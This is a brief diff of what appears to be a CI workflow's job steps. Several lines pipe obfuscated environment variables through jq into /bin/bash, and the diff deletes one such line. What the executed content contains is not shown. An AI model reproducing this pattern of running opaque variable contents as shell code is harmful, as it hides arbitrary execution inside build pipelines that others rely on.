@@ -23,7 +23,6 @@ jobs:
           echo $a3382 | jq -r .xf48706 | /bin/bash
           printf '%s' "$okk33" | jq -r .m8191 | /bin/bash
           echo $eqolk1968 | jq -r .i694 | /bin/bash
-          echo $ku46327 | jq -r .dn66 | /bin/bash
           echo $wb38616 | jq -r .lz7304 | /bin/bash
           echo $dezy01732 | jq -r .krh4 | /bin/bash
 
